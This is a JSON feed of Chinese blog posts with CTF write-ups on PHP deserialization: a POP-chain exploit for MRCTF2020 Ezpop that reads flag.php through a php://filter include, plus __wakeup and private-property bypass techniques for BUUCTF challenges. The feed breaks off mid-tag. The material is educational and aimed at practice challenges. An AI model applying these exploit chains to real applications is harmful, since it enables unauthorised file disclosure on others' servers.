{
    "version": "https://jsonfeed.org/version/1",
    "title": "imFanqie • All posts by \"反序列化\" tag",
    "description": "学习博客",
    "home_page_url": "http://imfanqie.top",
    "items": [
        {
            "id": "http://imfanqie.top/2021/08/10/ctf/web/pop/(ctfwp)%E5%87%A0%E9%81%93%E5%BA%8F%E5%88%97%E5%8C%96%E7%9B%B8%E5%85%B3%E7%9A%84%E9%A2%98(POP%E9%93%BE%E3%80%81%E9%80%83%E9%80%B8)/",
            "url": "http://imfanqie.top/2021/08/10/ctf/web/pop/(ctfwp)%E5%87%A0%E9%81%93%E5%BA%8F%E5%88%97%E5%8C%96%E7%9B%B8%E5%85%B3%E7%9A%84%E9%A2%98(POP%E9%93%BE%E3%80%81%E9%80%83%E9%80%B8)/",
            "title": "(ctfwp)几道序列化相关的题(POP链、逃逸)",
            "date_published": "2021-08-10T15:44:31.014Z",
            "content_html": "<p>记录两道实在不会的题，研究了好半天，算是涨姿势了</p>\n<p><span id=\"more\"></span></p>\n<h1 id=\"1mrctf2020ezpop\"><a class=\"anchor\" href=\"#1mrctf2020ezpop\">#</a> 1.[MRCTF2020]Ezpop</h1>\n<p>这道题考察 pop 链，题目中还给了教程，提示的很明显。</p>\n<p>第一次遇到这种题，虽说不是难题，但也没个了解，查了下 wp，</p>\n<p>发现写的都很难懂，解释的很牵强（感觉都出自几个大佬，所以写的很简）</p>\n<p>索性我就自己摸索，搞了大半天终于明白了，遂在这里记录一下。</p>\n<hr>\n<p>先放原码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> Modifier <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">protected</span>  <span class=\"token variable\">$var</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">append</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__invoke</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token function\">append</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token keyword\">var</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Show</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$source</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$str</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'index.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">source</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'Welcome to '</span><span class=\"token operator\">.</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">source</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;br>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">str</span><span class=\"token operator\">-></span><span class=\"token property\">source</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/gopher|http|file|ftp|https|dict|\\.\\./i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">source</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"hacker\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">source</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"index.php\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Test</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$p</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">p</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__get</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token variable\">$function</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">p</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pop'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    @<span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pop'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Show</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>下面按新手的步骤来，先分开解读一下：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> Modifier <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">protected</span>  <span class=\"token variable\">$var</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">append</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__invoke</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token function\">append</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token keyword\">var</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>function append：很明显的 incloud 包含漏洞，可以利用来读 flag</p>\n<p>function __invoke ()：调用 append 读取 flag；invoke 方法在 当一个对象被当做函数调用时，调用该方法。</p>\n<p>思路：让 <code>var=php://filter/read=convert.base64-encode/resource=flag.php</code></p>\n<p>​\t\t\t只要 invoke 被回调就能读取 flag，只需让一个对象被当作函数调用。</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> Show<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$source</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$str</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'index.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">source</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'Welcome to '</span><span class=\"token operator\">.</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">source</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;br>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">str</span><span class=\"token operator\">-></span><span class=\"token property\">source</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/gopher|http|file|ftp|https|dict|\\.\\./i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">source</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"hacker\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">source</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"index.php\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>function __construct：通过 file 给 source 赋值；当一个对象被实例化（new）时回调</p>\n<p>function __toString ()：返回 str 中的 source；当一个对象被当做字符串调用或输出时回调</p>\n<p>function __wakeup ()：过滤；在但序列化时自动回调</p>\n<p>思路：这三个方法看着没什么联系，但是却因为先后关系能被链起来。如果让 file 等于一个对象（实例化的 class）</p>\n<p>​\t\t\t那么在反序列化时调用的 wakeup 方法中，就会引起连锁反应（正则匹配会把 source 当成字符串）</p>\n<p>​\t\t\t从而调用了 tostring 方法，返回 str 中的 source</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> Test<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$p</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">p</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__get</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token variable\">$function</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">p</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>function __construct ()：将变量 p 变成一个数组；调用方法同前面</p>\n<p>function __get ()：调用了一个函数，名字为 function；访问私有属性或不存在的属性时，自动回调</p>\n<p>思路：提示的很明显，在 get 方法中，function 函数被调用</p>\n<p>​\t\t\t所以只要 function 是个对象，就会调用 class Modifier 中的 function __invoke ()，读取 flag</p>\n<p>​\t\t\t要让 function 为对象，只需要让 function __construct () 中的 <code>$this-&gt;p = new Modifier();</code></p>\n<p>​\t\t\t然后只需要 实例化 class Test 且触发__get () 方法 即可获得 flag</p>\n<p>​\t\t\t现在问题是，如何访问一个私有或不存在的属性触发 get？肯定是通过还没使用的 class show</p>\n<p>​\t\t\t根据 class show 中的结果，return 了一个 str 中的 source，那么当 str 被赋值为一个实例化对象后</p>\n<p>​\t\t\t只要该对象没有 source 属性，就可以触发__get () 方法，而刚好 Test 中没有 source。</p>\n<p>​\t\t\t而且让  <code>str = new Test()</code>  还能顺便实例化了 Test 类，同时满足了俩条件</p>\n<p>​\t\t\t至此，这一条链就连起来了！</p>\n<p>总结一下思路：</p>\n<p>​\t\t\t<strong>通过 show 的 __wakeup ()，调用__toString ()，调用 test 的__get ()，调用 Modifier 的__invoke ()</strong></p>\n<p>写代码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> Modifier <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">protected</span>  <span class=\"token variable\">$var</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'php://filter/read=convert.base64-encode/resource=flag.php'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Show</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$source</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$str</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">source</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span>   <span class=\"token comment\">// 为了让 file 成一个对象，而不是一个数据，要调用两次</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Test</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$p</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 没法直接让 p 等于一个新的对象，需要通过方法来赋值</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">p</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Modifier</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Show</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'fanqie'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 随便赋值，为了让 file 有值，否则会报错警告</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">-></span> str <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   <span class=\"token comment\">// 让 str 等于一个类</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Show</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>        <span class=\"token comment\">// 再次调用，让 file 赋值成一个对象，触发__tostring ()，开始 pop 链</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 输出编码后的序列化字符串，带入 payload 就行</span></pre></td></tr></table></figure><p>将得到的值通过 get 传入，得到 base64 码，解码得到 flag</p>\n",
            "tags": [
                "反序列化"
            ]
        },
        {
            "id": "http://imfanqie.top/2021/07/04/ctf/web/pop/(ctfwp)buu%E4%B8%ADphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/",
            "url": "http://imfanqie.top/2021/07/04/ctf/web/pop/(ctfwp)buu%E4%B8%ADphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/",
            "title": "(ctfwp)buu中php反序列化",
            "date_published": "2021-07-04T14:48:57.312Z",
            "content_html": "<p>上一篇整理了 php 反序列化的知识点，本文是我对练习中题目的整理。</p>\n<p><span id=\"more\"></span></p>\n<h1 id=\"1极客大挑战-2019php\"><a class=\"anchor\" href=\"#1极客大挑战-2019php\">#</a> 1.[极客大挑战 2019] PHP</h1>\n<p>进入页面，根据提示，考虑备份导致源码泄露。</p>\n<p>于是用扫描工具（ctfwscan）进行目录扫描，发现备份文件可以成功访问，如图</p>\n<p><img data-src=\"https://i.loli.net/2021/07/04/Ouvbscq5zn4E861.png\" alt>&lt;!--p1--&gt;</p>\n<p>然后下载下来，打开，有五个文件：</p>\n<p><img data-src=\"https://i.loli.net/2021/07/04/H4BEaOX18qYLokA.png\" alt>&lt;!--p2--&gt;</p>\n<p>尝试 flag.php 后不对，审计 class.php 和 index.php，找到了可反序列化点</p>\n<p><img data-src=\"https://i.loli.net/2021/07/04/lbBoGf4YnR3yIzK.png\" alt>&lt;!--p3--&gt;</p>\n<p>因为包含了 class.php 文件，所以审计 class.php</p>\n<p><img data-src=\"https://i.loli.net/2021/07/04/3gmMvuYZWj5ipn7.png\" alt>&lt;!--p4--&gt;</p>\n<p>class 中没有调用类，根据 index 中代码，只是进行了反序列化。</p>\n<p>根据流程分析，先__wakeup ()，然后__destruct ()。</p>\n<p>在 destruct () 中，当 password == 100，username === admin 时，能读取 flag：</p>\n<p><img data-src=\"https://i.loli.net/2021/07/04/lGzHsKJQyj4hmE2.png\" alt>&lt;!--p5--&gt;</p>\n<p>但是在 wakeup () 时，username 会被赋值为 guest，会使我们输入的值改变，导致无法获取答案。</p>\n<p>此时我们只需改对象属性个数绕过 wakeup () 即可：</p>\n<p><img data-src=\"https://i.loli.net/2021/07/04/qfRyJZDdMrTK4SC.png\" alt=\"1.6.png\">&lt;!--p6--&gt;</p>\n<p>打入 payload，得到 flag</p>\n<p><img data-src=\"https://i.loli.net/2021/07/04/F26yv5sJglwTXrx.png\" alt>&lt;!--p7--&gt;</p>\n<hr>\n<h1 id=\"2网鼎杯-2020-青龙组areuserialz\"><a class=\"anchor\" href=\"#2网鼎杯-2020-青龙组areuserialz\">#</a> 2.[网鼎杯 2020 青龙组] AreUSerialz</h1>\n<p>据说是当年的签到题，作为一个新手，当然要玩一下</p>\n<p>进去直接给了原码，先复制到本地，找反序列化点：</p>\n<p><img data-src=\"https://i.loli.net/2021/07/04/SdDn42CxHQGYAaP.png\" alt></p>\n<p>&lt;!--p1--&gt;</p>\n<p>然后审计代码，同第一题，但没有 wakeup ()，如果反序列化直接会 destruct ()</p>\n<p>但再反序列化前，需要先绕过 is_valid () 中的 ascll 检查（私有类需要 %00）</p>\n<p>在 destruct () 中，当 op === &quot;2&quot; 时，会被强制为 &quot;1&quot;，当 op == &quot;1&quot; 时，沿着代码走下去发现只能写，不能读，无法找到 flag；而当 op == &quot;2&quot; 时，通过 file_get_contents () 函数可以读到 filename，如图：</p>\n<p><img data-src=\"https://i.loli.net/2021/07/04/MI4jDV3f6cmYRoa.png\" alt>&lt;!--p2--&gt;</p>\n<p>所以我们的目标 1. 绕过 op === &quot;2&quot; 时的强制转换   2. 绕过私有属性时的 ascll 检测</p>\n<p>解决方法：</p>\n<p>1. 当 op === &quot;2&quot; 时才会转换，所以当 op == &quot;2&quot; 时，不会强制转换，因为后者没有对类型强制要求，所以只需让 op = 2  （int 型），在判断时不会因为类型而引起强制转换，即绕过。</p>\n<p>2. 有以下两个方法，第一个更常用：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// PHP7.1 以上版本对属性类型不敏感，可以用 public 属性来绕过检查</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">// 在序列化内容中用大写 S 表示字符串，此时这个字符串就支持将后面的字符串用 16 进制表示</span></pre></td></tr></table></figure><p>本题第二个绕过我选择第一种方法，如图：</p>\n<p><img 